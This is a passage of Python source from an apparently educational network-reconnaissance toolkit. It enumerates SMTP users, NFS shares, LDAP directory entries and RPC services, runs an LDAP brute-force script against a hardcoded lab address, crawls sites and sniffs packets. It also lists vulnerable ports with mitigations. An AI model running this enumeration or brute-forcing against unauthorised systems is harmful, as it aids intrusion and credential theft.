                    smtpUsersList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(smtp[host][proto][port]['script']['smtp-enum-users'])]
                    cur.execute('''INSERT INTO RecDB.SMTP_Users_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Users) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', smtpUsersList)
                    conn.commit()
                else:
                    print("Port 25 (SMTP) not opened, can't perform SMTP Enumeration")

#NFS Share Enumeration
def nfs_share():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-p 2049')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)

            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    smtp = nmap.PortScanner()
                    smtp.scan(host, arguments='-sV -p 2049 --script nfs-showmount')
                    print("\nnfs-showmount:")
                    print(smtp[host][proto][port]['script']['nfs-showmount'])
                    nfsShareList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(smtp[host][proto][port]['script']['nfs-showmount'])]
                    cur.execute('''INSERT INTO RecDB.NFS_Share_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Shares) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', nfsShareList)
                    conn.commit()
                else:
                    print("Port 2049 (NFS) not opened, can't perform NFS Enumeration")

#LDAP Information Enumeration
def ldap_info():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 389')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    server = ldap3.Server(target, get_info=ldap3.ALL, port=389)
                    connection = ldap3.Connection(server)
                    connection.bind()
                    print(server.info)
                    ldapInfoList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(server.info)]
                    cur.execute('''INSERT INTO RecDB.LDAP_Information_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Server_Info) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', ldapInfoList)
                    conn.commit()
                else:
                    print("Port 389 (LDAP) not opened, can't perform LDAP Enumeration")
#LDAP Users Enumeration
def ldap_users():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-sU -p 389')
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    server = ldap3.Server(target, get_info=ldap3.ALL, port=389)
                    connection = ldap3.Connection(server)
                    connection.bind()
                    connection.search(search_base='DC=CEH,DC=com', 
                                      search_filter='(&(objectclass=person))')
                    print(connection.entries)
                    ldapUsersList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(connection.entries)]
                    cur.execute('''INSERT INTO RecDB.LDAP_Users_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, Connection_Entries) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', ldapUsersList)
                    conn.commit()
                else:
                    print("Port 389 (LDAP) not opened, can't perform LDAP Enumeration")

#LDAP Username Enumeration using LDAP Brute
def ldap_brute():
    scanner = nmap.PortScanner()
    target = input("Enter IP Address: ")
    scanner.scan(target, arguments='-p 389')
    dn = input("Enter Domain Name: ")
    tld = input("Enter Top Level Domain(eg. com, org): ")
    for host in scanner.all_hosts():
        print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
     
            lport = scanner[host][proto].keys()
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    print ('port : %s\tstate : %s'
                            % (port, scanner[host][proto][port]['state']))
                    ldap = nmap.PortScanner()
                    ldapBase = 'cn=users, dc=' + dn + ', dc=' + tld
                    print(ldapBase)

                    arguments = "-p 389 --script ldap-brute --script-args ldap.base=\'\"" + ldapBase +"\"\'"
                    ldap.scan(host, arguments=arguments)
                    ldap.scan("10.10.1.22", arguments='-p 389 --script ldap-brute --script-args ldap.base=\'"cn=users, dc=CEH, dc=com"\'')
                    print(ldap[host][proto][port]['script']['ldap-brute'])
                    ldapBruteList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                    str(ldap[host][proto][port]['script']['ldap-brute'])]
                    cur.execute('''INSERT INTO RecDB.LDAP_Brute_Enumeration 
                    (id, Host, Protocol, Port_Number, Port_Status, ldap_brute) 
                    VALUES (NULL, ?, ?, ?, ?, ?)''', ldapBruteList)
                    conn.commit()
                else:
                    print("Port 389 (LDAP) not opened, can't perform LDAP Enumeration")


def googleSearch():
    toSearch = input("What do you want to search? ")
    print("\nResults:")
    for searchItem in search(toSearch, num=10, stop=10):
        print(searchItem)
        googleSearchList = [str(toSearch), str(searchItem)]
        cur.execute('''INSERT INTO RecDB.Google_Search 
        (id, Search, Results) 
        VALUES (NULL, ?, ?)''', googleSearchList)
        conn.commit()

#Spidering / Crawling Domains
def spidering():
    url = str(input("Enter website to crawl here (e.g. https://www.np.edu.sg): "))
    max_urls = int(input("Enter maximum number of sub-domains to crawl here (Rec. 5): "))

    colorama.init()
    GREEN = colorama.Fore.GREEN
    GRAY = colorama.Fore.LIGHTBLACK_EX
    RESET = colorama.Fore.RESET
    YELLOW = colorama.Fore.YELLOW

    internal_urls = set()
    in_list = []
    SpideringList_in = []
    external_urls = set()
    SpideringList_ex = []
    ex_list = []

    def is_valid(url):
        parsed = urlparse(url)
        return bool(parsed.netloc) and bool(parsed.scheme)

    def get_all_website_links(url):
        urls = set()
        domain_name = urlparse(url).netloc
        soup = BeautifulSoup(requests.get(url).content, "html.parser")

        for a_tag in soup.findAll("a"):
            href = a_tag.attrs.get("href")
            if href == "" or href is None:
                continue

            href = urljoin(url, href)
            parsed_href = urlparse(href)
            href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path

            if not is_valid(href):
                continue
            if href in internal_urls:
                continue
            if domain_name not in href:
                if href not in external_urls:
                    ex_list.append(href)
                    print(f"{GRAY}[!] External link: {href}{RESET}")
                    external_urls.add(href)
                continue
            in_list.append(href)
            print(f"{GREEN}[*] Internal link: {href}{RESET}")
            urls.add(href)
            internal_urls.add(href)
        return urls

    def crawl(url, max_urls):
        global total_urls_visited
        total_urls_visited += 1
        print(f"{YELLOW}[*] Crawling: {url}{RESET}")
        links = get_all_website_links(url)
        for link in links:
            if total_urls_visited > max_urls:
                break
            crawl(link, max_urls=max_urls)

    if __name__ == "__main__":
        crawl(url,max_urls)
        while len(in_list) > len(ex_list):
            ex_list.append("NULL")
            continue
        pos = 0
        for i in in_list:
            Spiderman = [in_list[pos], ex_list[pos]]
            cur.execute('''INSERT INTO SpiDB.Spider 
            (id, Internal_Links, External_Links) 
            VALUES (NULL, ?, ?)''', Spiderman)
            conn.commit()
            pos += 1
        # with open('Spider.csv', 'w', newline='') as f:
        #     writer = csv.writer(f)
        #     writer.writerow(['Internal_URLS', 'External_URLs'])
        #     for i in in_list:
        #         Spiderman = [in_list[pos], ex_list[pos]]
        #         writer.writerow(Spiderman)
        #         pos += 1
        print("[+] Total Internal links:", len(internal_urls))
        print("[+] Total External links:", len(external_urls))
        print("[+] Total URLs:", len(external_urls) + len(internal_urls))

def whois_enum():
    import whois
    def get_ip_address(domain):
        try:
            ip_address = socket.gethostbyname(domain)
            return ip_address
        except socket.gaierror:
            print("Invalid domain or unable to resolve domain name.")
            sys.exit(1)

    def run_traceroute(ip_address):
        try:
            webb.traceroute("your-web-page-url")
        except subprocess.CalledProcessError:
            print("Failed to run traceroute.")

    def get_whois_info(domain):
        try:
            whois_info = whois.whois(domain)
            print(whois_info)
        except whois.parser.PywhoisError:
            print("Failed to retrieve WHOIS information.")

    def main():
        domain = input("Enter the domain name: ")

        # Get IP address
        ip_address = get_ip_address(domain)
        print("IP address: " + ip_address)


        # Get WHOIS information
        print("WHOIS information:")
        get_whois_info(domain)

        whoisEnumList = [str(ip_address), str(domain)]
        cur.execute('''INSERT INTO RecDB.Whois_Enumeration 
        (id, Host, Domain) 
        VALUES (NULL, ?, ?)''', whoisEnumList)
        conn.commit()

    if __name__ == "__main__":
        main()

def rpc_info():
    target = input("Enter IP address: ")
    nm = nmap.PortScanner()
    nm.scan(target, arguments='-p 111 --script rpcinfo')
    rpc_info = nm[target]['tcp'][111]['script']['rpcinfo']
    # Process the RPC information as needed
    print(rpc_info)
    rpcList = [str(target), str(rpc_info)]
    cur.execute('''INSERT INTO RecDB.RPC 
    (id, Host, RPC_Info) 
    VALUES (NULL, ?,?)''', rpcList)
    conn.commit()

def packet_sniffer():
    def packet_callback(packet):
        packet.show()
        p = str(packet.show(dump=True))
        plist[3] = p
        cur.execute('''INSERT INTO ExpDB.Packet_Sniffing 
        (id, Interface, Timeout, Filter, Packet) 
        VALUES (NULL, ?, ?, ?, ?)''', plist)
        conn.commit()
        
    while True:

        try:
            plist = []
            interface = input("Enter network interface: ")
            plist.append(interface)
            capture = sniff(iface = interface, timeout = 0)
            break
        except OSError:
            print("Not a valid interface. Please try again.")
            
    while True:
        try:
            timeout = int(input("How long do you want to sniff for? (in seconds): "))
            plist.append(timeout)
            break
        except:
            print("Not a valid input. Please try again.")
    
    while True:
        try:
            toFilter = input("What do you want to filter? (eg. dst port ftp / icmp, or enter nothing for no filter): ")
            plist.append(toFilter)
            plist.append('test')
            capture = sniff(iface = interface, timeout = 0, filter = toFilter)
            break
        except:
            print("Failed to compile filter expression " + toFilter + '. Please try again.')


    
    if filter == "":
        capture = sniff(iface = interface, prn=packet_callback, timeout = timeout)
    else: 
        capture = sniff(iface = interface, prn=packet_callback, timeout = timeout, filter = toFilter)

def vulnerable_tcp_ports():
    
    vulnerable_tcp_ports = [[7, "Echo", "Vulneraility: \nDOS Threat: Attackers may use it to relay flooding data and to flood the port with a large volume of requests, consuming network resources and causing a service disruption. \nAmplification Attacks: Since the Echo protocol will respond with an exact copy, attackers may send small requests to port 7, and the Echo protocol may potentially amplify the attack and increase its impact.\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troublehshooting."], 
    
    [19, "Chargen", "Vulnerability: \nDOS Threat: Attackers may loop it to the echo port, creating a DOS Attack.\nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troubleshooting."],
    
    [20, "FTP [File Transfer Protocol]", "Vulnerability: \nData leakage, unauthorized file access.\nSolution: \nConsider using FTPS (FTP over SSL/TLS) or SFTP (SSH File Transfer Protocol). These protocols provide encryption of data in transit and stronger security controls as compared to the traditional FTP."],
    
    [21, "FTP Control", "Vulnerability: \nWeak authentication, anonymous access, FTP bounce attacks.\nSolution: \nDeploy Intrustion Detection/Prevention Systems (IDS/IPS) to monitor and detect any suspicious activities or attempts to exploit vulnerabilities in the FTP server. Set up alerts and response mechanisms to mitigate potential attacks."],
    
    [22, "SSH [Secure Shell]", "Vulnerability: \nOlder versions of the SSH protocol may have vulnerabilities that can be exploited by attackers.\nSolution: \nKeep the SSH software updated with the latest security patches. Configure SSH server settings to enhance security. This may include disabling insecure SSH protocol versions, limiting the number of failed login attempts, and restricting SSH access to specific IP addresses or networks that may seem vulnerable."],
    
    [23, "Telnet", "Vulnerability: \nThe data that telnet transmits, including usernames and passwords, are not encrypted and is in plaintext. This makes it vulnerable to eavesdropping and unauthorized access.\nSolution: \nConisder replacing Telnet with SSH for remote administration as SSH provices encrypted communication and stronger authentication, mitigating the vulnerailities associated with Telnet."],
    
    [25, "SMTP [Simple Mail Transfer Protocol]", "Vulnerability: \nEmail Spoofing attacks. Attackers may forge the sender's email address, leading to phishing and social engineering attacks.\nSolution: \nImplement authentication mechanisms, such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting, and Conformance (DMARC). These can verify the authenticity of emails and prevent email spoofing."],
    
    [53, "DNS [Domain Name System]", "Vulneraility: \nDOS Threat: Attackers may flood DNS servers with a high volume of requests, causing service disruption and denying legitimate users access. \nDNS Spoofing Threat:Attackers may manipulate DNS responses to redirect users to malicious websites or intercept their traffic by poisoning the DNS cache.\nSolution: \nImplement Rate Limiting by configuring your DNS server to limit the rate of incoming DNS queries from a single source to prevent DNS amplification and DoS attacks. \nImplement DNSSEC (DNS Security Extensions) which adds digital signatures and authentication to DNS responses, ensuring data integrity and preventing cache poisoning attacks."],
    
    [80, "HTTP [Hypertext Transfer Protocol]", "Vulnerability: \nCross-Site Scripting (XSS) and SQL Injection leading to unauthorized access, data leakage, data manipulation, data theft, or session hijacking.\nWhen data is being transmitted over HTTP, it is not encrypted and is sent in plaintext. This means that anyone with access to the network can potentially intercept and read the information being transmitted. This lack of encryption makes HTTP vulnerable to eavesdropping and data interception.\nSolution: \nDeploy a Web Application Firewall (WAF) to filter and block malicious web wtraffic, helping to protect against XSS and SQL Injections.\nEnable SSL/TLS over HTTP to use HTTPS (HTTP Secure) to encrypt the data being transmitted, ensuring that the data cannot be easily intercepted or tampered with."],
    
    [110, "POP3 [Post Office Protocol v.3]", "Vulnerability: \nPOP3 transmits data, including usernames and passwords, in plaintext format, making it susceptible to eavesdropping and interception.\nSolution: \nEnable SSL/TLS encryption for POP3 (usually on port 995) to ensure secure communication and protect sensitive information"],
    
    ["111, SUN Remote Procedure Call Service","Vulnerability: \nBuffer Overflows: Like other network services, RPC services might be vulnerable to buffer overflow attacks, where an attacker can send malicious data to a vulnerable service, causing it to crash or execute arbitrary code.\nRPC data transmitted over the network can be intercepted and read by attackers if encryption is not employed.\nSolution: \nIf specific RPC services are not required, consider disabling or removing them to reduce the attack surface. Only enable the necessary RPC services needed for your system's functionality.\nImplement strong authentication and authorization mechanisms for RPC services. Ensure that only authorized users or systems can access the RPC services.\nEnable encryption for RPC communication using protocols such as SSL/TLS or IPsec to protect the confidentiality and integrity of data transmitted over the network."],
    
    [137, "NetBIOS over TCP/IP", "Vulnerability: \nSMB (Server Message Block) Protocol Vulnerabilities: NetBIOS utilizes the SMB protocol for file and printer sharing, which can have vulnerabilities that can be exploited by attackers. \nSolution: \nKeep the SMB server software up to date with the latest security patches. Disable SMB version 1 (SMBv1) and use newer versions (such as SMBv2 or SMBv3) that have improved security features. Implement proper access controls, strong authentication mechanisms, and encryption for SMB communication."],
    
    [138, "NetBIOS over TCP/IP", "Vulnerability: \nSMB (Server Message Block) Protocol Vulnerabilities: NetBIOS utilizes the SMB protocol for file and printer sharing, which can have vulnerabilities that can be exploited by attackers.\nSolution: \nKeep the SMB server software up to date with the latest security patches. Disable SMB version 1 (SMBv1) and use newer versions (such as SMBv2 or SMBv3) that have improved security features. \
    Implement proper access controls, strong authentication mechanisms, and encryption for SMB communication."],
    
    [139, "NetBIOS over TCP/IP", "Vulnerability: \nSMB (Server Message Block) Protocol Vulnerabilities: NetBIOS utilizes the SMB protocol for file and printer sharing, which can have vulnerabilities that can be exploited by attackers.\nSolution: \nKeep the SMB server software up to date with the latest security patches. Disable SMB version 1 (SMBv1) and use newer versions (such as SMBv2 or SMBv3) that have improved security features. Implement proper access controls, strong authentication mechanisms, and encryption for SMB communication."],
    
    [143, "IMAP [Internet Message Access Protocol]", "Vulnerability: \nIMAP transmits data, including usernames and passwords, in plain text format, making it susceptible to eavesdropping and interception.\nSolution: \nEnable SSL/TLS encryption for IMAP (usually on port 993) to ensure secure communication and protect sensitive information."],
    
    [161, "SNMP [Simple Network Management Protocol]", "Vulnerability: \nWeak Community Strings: SNMP uses community strings for authentication, and if weak or default community strings are used, attackers can gain unauthorized access.\nSolution: \nUse strong and unique community strings. Avoid using default or easily guessable community strings."],
    
    [443, "HTTPS [Hypertext Transfer Protocol Secure]", "Vulnerability: \nCertificate-based Vulnerabilities: Improperly issued or expired SSL/TLS certificates can weaken the security of HTTPS connections.\nSSL Downgrading: The attacker may manipulate the communication in a way that the negotiation process results in the use of an older or weaker SSL/TLS version.\nSolution: \nRegularly update SSL/TLS certificates and ensure they are properly issued and configured. Implement certificate revocation mechanisms to invalidate compromised or revoked certificates.\nStrict Transport Security (HSTS): Websites can implement HSTS, a response header that instructs the client to always use HTTPS and prevents the client from accepting downgraded connections."], 
    
    [445, "Microsoft-DS [SMB]", "Vulnerability: \nSMB Signing Disabled: If SMB signing is disabled, it could potentially allow attackers to conduct man-in-the-middle attacks and modify data exchanged between systems.\nSolution: \nImplement SMB Signing: Enforce SMB signing to ensure the integrity and authenticity of data transmitted between systems, preventing man-in-the-middle attacks."],
    
    [512, "r-services, RSH [Remote Shell]", "Vulnerability: \nWeak Authentication: RSH relies on weak or insecure authentication mechanisms, such as using host-based authentication or clear text passwords.\nSolution: \nDisable or block RSH services if not needed. Use more secure alternatives like SSH (Secure Shell)for remote command execution. If RSH is required, use strong authentication mechanisms like public key authentication or Kerberos, which provide better security than host-based authentication or clear text passwords."],
    
    [513, "r-services, REXEC [Remote Execution]", "Vulnerability: \nWeak Authentication: REXEC uses clear text passwords for authentication, making it susceptible to eavesdropping and interception.\nSolution: \nDisable or block REXEC services if not needed. Use more secure alternatives like SSH for remote command execution. If REXEC is required, use strong authentication mechanisms like public key authentication or Kerberos, \
    which provide better security than clear text passwords."],
    
    [514, "r-services, Syslog", "Vulnerability: \nLog Manipulation: Attackers can tamper with syslog messages, modify log entries, or flood the logging server with excessive logs to disrupt logging operations or hide their activities.\nSolution: \nImplement access controls and proper authentication mechanisms to restrict access to the syslog server and prevent unauthorized modifications or tampering of logs."],
    
    [1433, "Microsoft SQL Server [ms-sql-s]", "Vulnerability: \nSQL Injection: If the SQL Server is not properly secured, attackers can exploit vulnerabilities in web applications or other entry points to inject malicious SQL queries into the database.\nSolution: \nImplement proper input validation and parameterized queries in web applications to prevent SQL injection attacks."],
    
    [1434, "Microsoft SQL Monitor [ms-sq-m]", "Vulnerability: \nSSRP Spoofing: Attackers can spoof the SQL Server Browser service responses, potentially redirecting clients to malicious or unauthorized SQL Server instances.\nSolution: \nEnable Authentication: Configure the SQL Server Browser service to require authentication for client connections. By enabling authentication, you ensure that only authorized clients can access the service."],
    
    [1723, "PPTP VPN [Point-to-Point Tunelling Protocol Virtual Private Network]", "Vulnerability: \nWeak Encryption: PPTP uses weak encryption algorithms, making it susceptible to attacks like brute force and decryption.\nSolution: \nConsider using more secure VPN protocols like OpenVPN or IPsec instead of PPTP. If PPTP is used, implement strong passwords and enforce account lockouts after multiple failed login attempts."],
    
    [3306, "MySQL Server", "Vulnerability: \nMonitor for Suspicious Activity: Implement intrusion detection and monitoring systems to detect and alert on any unauthorized access attempts or suspicious behavior related to RDP.\nSolution: \nImplement proper input validation and parameterized queries in web applications to prevent SQL injection attacks."],
    
    [3389, "RDP [Remote Desktop Protocol]", "Vulnerability: \nCredential Theft: If an attacker gains access to a system with RDP enabled, they can attempt to steal credentials or perform lateral movement within the network.\nSolution: \nNetwork Segmentation: Restrict RDP access to trusted networks or specific IP addresses using firewalls or network segmentation. Avoid exposing RDP directly to the internet if possible.\nMonitor for Suspicious Activity: Implement intrusion detection and monitoring systems to detect and alert on any unauthorized access attempts or suspicious behavior related to RDP."],
    
    [8080, "HTTP Proxy", "Vulnerability: \nCross-Site Scripting (XSS) and SQL Injection leading to unauthorized access, data leakage, data manipulation, data theft, or session hijacking.\nWhen data is being transmitted over HTTP, it is not encrypted and is sent in plaintext. This means that anyone with access to the network can potentially intercept and read the information being transmitted. This lack of encryption makes HTTP vulnerable to eavesdropping and data interception.\nSolution: \nDeploy a Web Application Firewall (WAF) to filter and block malicious web wtraffic, helping to protect against XSS and SQL Injections.\nEnable SSL/TLS over HTTP to use HTTPS (HTTP Secure) to encrypt the data being transmitted, ensuring that the data cannot be easily intercepted or tampered with."],
    
    [8443, "HTTPS", "Vulnerability: \nCertificate-based Vulnerabilities: Improperly issued or expired SSL/TLS certificates can weaken the security of HTTPS connections.\nSSL Downgrading: The attacker may manipulate the communication in a way that the negotiation process results in the use of an older or weaker SSL/TLS version.\nSolution: \nRegularly update SSL/TLS certificates and ensure they are properly issued and configured. Implement certificate revocation mechanisms to invalidate compromised or revoked certificates.\nStrict Transport Security (HSTS): Websites can implement HSTS, a response header that instructs the client to always use HTTPS and prevents the client from accepting downgraded connections."]]
    
    
    
    target = input("Enter an IP Address to scan: ")
    port_range = input("Enter the range of ports to scan (eg. 1-1024, or enter nothing for no port range): ")
    scanner = nmap.PortScanner()
    if port_range == "":
        scanner.scan(target)
        for host in scanner.all_hosts():
            print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            print('Vulnerable Ports:')
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    for vulnerable_ports in vulnerable_tcp_ports:
                        if port in vulnerable_ports:
                            print ('port : %s\tstate : %s\tservice : %s\n%s'
                                % (port, scanner[host][proto][port]['state'], vulnerable_ports[1], vulnerable_ports[2]))
                            VulnerablePortsList = [target, scanner[host][proto], port, scanner[host][proto][port]['state'],
                                                   vulnerable_ports[1], vulnerable_ports[2]]
                            cur.execute('''INSERT INTO VulDB.Vulnerable_Ports 
                            (id, Host, Protocol, Port, State, Service, Vulnerability, Solution) 
                            VALUES (NULL, ?, ?, ?, ?, ?, ?, ?)''', VulnerablePortsList)
                            conn.commit()
                      
    else:
        scanner.scan(target, port_range)
        for host in scanner.all_hosts():
            print(host)
        for proto in scanner[host].all_protocols():
            print('----------')
            print('Protocol : %s' % proto)
 
            lport = scanner[host][proto].keys()
            print('Vulnerable Ports:')
            for port in lport:
                if scanner[host][proto][port]['state'] == "open":
                    for vulnerable_ports in vulnerable_tcp_ports:
                        if port in vulnerable_ports:
                            print ('port : %s\tstate : %s\tservice : %s\n%s'
                                % (port, scanner[host][proto][port]['state'], vulnerable_ports[1], vulnerable_ports[2]))
                            VulnerablePortsList = [str(host), str(proto), str(port), str(scanner[host][proto][port]['state']),
                            str(scanner[host][proto][port]['name'])]
                            #cur.execute('''INSERT INTO VulDB.Vulnerable_Ports 
                            #(id, Host, Protocol, Port_Number, Port_Status, Vulnerability) 
                            #VALUES (NULL, ?, ?, ?, ?, ?)''', VulnerablePortsList)
                            conn.commit()
                            
                            
def vulnerable_udp_ports():
    
    vulnerable_udp_ports =  [[7, "Echo", "Vulneraility: \nDOS Threat: Attackers may use it to relay flooding data and to flood the port with a large volume of requests, consuming network resources and causing a service disruption. \n Amplification Attacks: Since the Echo protocol will respond with an exact copy, attackers may send small requests to port 7, and the Echo protocol may potentially amplify the attack and increase its impact. \nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troublehshooting."], 
    
    [19, "Chargen", "Vulnerability: \nDOS Threat: Attackers may loop it to the echo port, creating a DOS Attack. \nSolution: \nDisable this port or restrict access to this port, and enable briefly only for troubleshooting."],
    
    [53, "DNS [Domain Name System]", "Vulneraility: \nDOS Threat: Attackers may flood DNS servers with a high volume of requests, causing service disruption and denying legitimate users access. \nDNS Spoofing Threat:Attackers may manipulate DNS responses to redirect users to malicious websites or intercept their traffic by poisoning the DNS cache. \nSolution: \nImplement Rate Limiting by configuring your DNS server to limit the rate of incoming DNS queries from a single source to prevent DNS amplification and DoS attacks. \n Implement DNSSEC (DNS Security Extensions) which adds digital signatures and authentication to DNS responses, ensuring data integrity and preventing cache poisoning attacks."],

    ["69, Trivial File Transfer Protocl","Vulnerability: \nNo Authentication: TFTP does not provide any built-in authentication mechanism, which means that anyone with access to the TFTP server can read from or write to files on the server without requiring any credentials.\nNo Encryption: TFTP does not support encryption, which means that data transmitted over the network is in clear text and can be intercepted by attackers. \nSolution: \nReview and configure the TFTP server to provide the necessary access rights only to authorized users. Avoid providing write access to critical system files or directories.\nIsolate critical systems or sensitive files from the TFTP server by using network segmentation. This ensures that even if the TFTP server is compromised, the impact on other parts of the network is limited."],

    [80, "HTTP [Hypertext Transfer Protocol]", "Vulnerability: \nCross-Site Scripting (XSS) and SQL Injection leading to unauthorized access, data leakage, data manipulation, data theft, or session hijacking.\nWhen data is being transmitted over HTTP, it is not encrypted and is sent in plaintext. This means that anyone with access to the network can potentially intercept and read the information being transmitted. This lack of encryption makes HTTP vulnerable to eavesdropping and data interception.\nSolution: \nDeploy a Web Application Firewall (WAF) to filter and block malicious web wtraffic, helping to protect against XSS and SQL Injections.\nEnable SSL/TLS over HTTP to use HTTPS (HTTP Secure) to encrypt the data being transmitted, ensuring that the data cannot be easily intercepted or tampered with."],

    [111, "SUN Remote Procedure Call Service","Vulnerability: \nBuffer Overflows: Like other network services, RPC services might be vulnerable to buffer overflow attacks, where an attacker can send malicious data to a vulnerable service, causing it to crash or execute arbitrary code.\nRPC data transmitted over the network can be intercepted and read by attackers if encryption is not employed. \nSolution: \nIf specific RPC services are not required, consider disabling or removing them to reduce the attack surface. Only enable the necessary RPC services needed for your system's functionality.\nImplement strong authentication and authorization mechanisms for RPC services. Ensure that only authorized users or systems can access the RPC services.\nMitigation: Enable encryption for RPC communication using protocols such as SSL/TLS or IPsec to protect the confidentiality and integrity of data transmitted over the network."],

    [123, "Network Time Protocpl", "Vulnerability: \nNTP Amplification Attacks: Attackers can abuse misconfigured NTP servers to amplify the volume of traffic directed at a target, leading to Distributed Denial of Service (DDoS) attacks. This is similar to other amplification  attacks like DNS amplification. NTP Reflection Attacks: Attackers can use NTP servers to reflect and amplify traffic to a target, making it appear as if the requests are originating from the NTP server itself. \nSolution: \nSet rate-limiting rules on NTP servers to prevent excessive requests from a single source, mitigating the impact of amplification and reflection attacks.\nConsider using NTP Pool servers instead of running your own publicly accessible NTP server. NTP Pool servers are community-managed and distributed, reducing the risk of abuse."],
    
    [137, "NetBIOS over TCP/IP", "Vulnerability: \nSMB (Server Message Block) Protocol Vulnerabilities: NetBIOS utilizes the SMB protocol for file and printer sharing, which can have vulnerabilities that can be exploited by attackers. \nSolution: \nKeep the SMB server software up to date with the latest security patches. Disable SMB version 1 (SMBv1) and use newer versions (such as SMBv2 or SMBv3) that have improved security features. Implement proper access controls, strong authentication mechanisms, and encryption for SMB communication."],
   
    [138, "NetBIOS over TCP/IP", "Vulnerability: \nSMB (Server Message Block) Protocol Vulnerabilities: NetBIOS utilizes the SMB protocol for file and printer sharing, which can have vulnerabilities that can be exploited by attackers. \nSolution: \nKeep the SMB server software up to date with the latest security patches. Disable SMB version 1 (SMBv1) and use newer versions (such as SMBv2 or SMBv3) that have improved security features. Implement proper access controls, strong authentication mechanisms, and encryption for SMB communication."],
    
    [139, "NetBIOS over TCP/IP", "Vulnerability: \nSMB (Server Message Block) Protocol Vulnerabilities: NetBIOS utilizes the SMB protocol for file and printer sharing, which can have vulnerabilities that can be exploited by attackers. \nSolution: \nKeep the SMB server software up to date with the latest security patches. Disable SMB version 1 (SMBv1) and use newer versions (such as SMBv2 or SMBv3) that have improved security features. Implement proper access controls, strong authentication mechanisms, and encryption for SMB communication."],
    
    [161, "SNMP [Simple Network Management Protocol]", "Vulnerability: \nWeak Community Strings: SNMP uses community strings for authentication, and if weak or default community strings are used, attackers can gain unauthorized access. \nSolution: \nUse strong and unique community strings. Avoid using default or easily guessable community strings."],
    
    [443, "HTTPS [Hypertext Transfer Protocol Secure]", "Vulnerability: \nCertificate-based Vulnerabilities: Improperly issued or expired SSL/TLS certificates can weaken the security of HTTPS connections. \nSSL Downgrading: The attacker may manipulate the communication in a way that the negotiation process results in the use of an older or weaker SSL/TLS version. \nSolution: \nRegularly update SSL/TLS certificates and ensure they are properly issued and configured. Implement certificate revocation mechanisms to invalidate compromised or revoked certificates. \nStrict Transport Security (HSTS): Websites can implement HSTS, a response header that instructs the client to always use HTTPS and prevents the client from accepting downgraded connections."],
    
    [445, "Microsoft-DS [SMB]", "Vulnerability: \nSMB Signing Disabled: If SMB signing is disabled, it could potentially allow attackers to conduct man-in-the-middle attacks and modify data exchanged between systems.\nSolution: \nImplement SMB Signing: Enforce SMB signing to ensure the integrity and authenticity of data transmitted between systems, preventing man-in-the-middle attacks."],
    
    [1433, "Microsoft SQL Server [ms-sql-s]", "Vulnerability: \nSQL Injection: If the SQL Server is not properly secured, attackers can exploit vulnerabilities in web applications or other entry points to inject malicious SQL queries into the database. \nSolution: \nImplement proper input validation and parameterized queries in web applications to prevent SQL injection attacks."],
    
    [1434, "Microsoft SQL Monitor [ms-sq-m]", "Vulnerability: \nSSRP Spoofing: Attackers can spoof the SQL Server Browser service responses, potentially redirecting clients to malicious or unauthorized SQL Server instances. \nSolution: \nEnable Authentication: Configure the SQL Server Browser service to require authentication for client connections. By enabling authentication, you ensure that only authorized clients can access the service."],
    
    [1900, "SSDP [Simple Service Delivery Protocol]", "Vulnerability: \nReflection and Amplification Attacks: Attackers can abuse the SSDP protocol to launch reflection and amplification attacks, where they send small requests to SSDP-enabled devices, which then respond with larger responses to a targeted victim, potentially causing network congestion or denial of service. \nSolution: \nDisable or Restrict SSDP: If SSDP is not necessary for the functionality of your network or devices, consider disabling or restricting SSDP traffic at the network level."],
    
    [5353, "mDNS [Multicast Domain Name System]", "Vulnerability: \nDNS Spoofing: Attackers can spoof or manipulate mDNS responses, redirecting clients to malicious or unauthorized services. \nSolution: \nDNSSEC (DNS Security Extensions): If possible, consider implementing DNSSEC to validate the authenticity and integrity of mDNS responses, reducing the risk of DNS spoofing."],
    
